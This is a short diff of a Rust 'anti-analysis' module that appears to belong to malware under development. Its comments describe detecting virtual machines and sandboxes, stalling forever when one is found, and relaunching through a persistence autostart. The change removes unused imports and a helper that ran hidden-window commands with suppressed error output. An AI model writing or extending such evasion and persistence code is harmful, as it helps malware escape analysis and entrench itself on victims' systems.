@@ -1,8 +1,6 @@
 //! Anti-analysis module — VM detection, sandbox detection, environment probing.
 //! Port of EnvironmentProbe.cs, SandboxDetector.cs, VmDetector.cs.
 
-use std::process::Command;
-
 /// Main entry point: returns true if it's safe to execute.
 /// If a sandbox is detected, sleeps indefinitely and returns false.
 /// `skip_uptime`: skip the uptime < 5min check (used when launched from persistence autostart).
@@ -155,7 +153,6 @@ fn check_windows_vm() -> bool {
 #[cfg(target_os = "windows")]
 fn vm_service_running(name: &str) -> bool {
     use windows::Win32::System::Services::*;
-    use windows::Win32::System::Threading::*;
     use windows_core::PCWSTR;
 
     unsafe {
@@ -198,29 +195,4 @@ fn check_linux_vm() -> bool {
         }
     }
     false
-}
-
-fn exec(cmd: &str, args: &[&str]) -> Result<String, ()> {
-    #[cfg(windows)]
-    {
-        use std::os::windows::process::CommandExt;
-        let output = Command::new(cmd)
-            .args(args)
-            .creation_flags(0x08000000)
-            .stdout(std::process::Stdio::piped())
-            .stderr(std::process::Stdio::null())
-            .output()
-            .map_err(|_| ())?;
-        Ok(String::from_utf8_lossy(&output.stdout).to_string())
-    }
-    #[cfg(not(windows))]
-    {
-        let output = Command::new(cmd)
-            .args(args)
-            .stdout(std::process::Stdio::piped())
-            .stderr(std::process::Stdio::null())
-            .output()
-            .map_err(|_| ())?;
-        Ok(String::from_utf8_lossy(&output.stdout).to_string())
-    }
 }
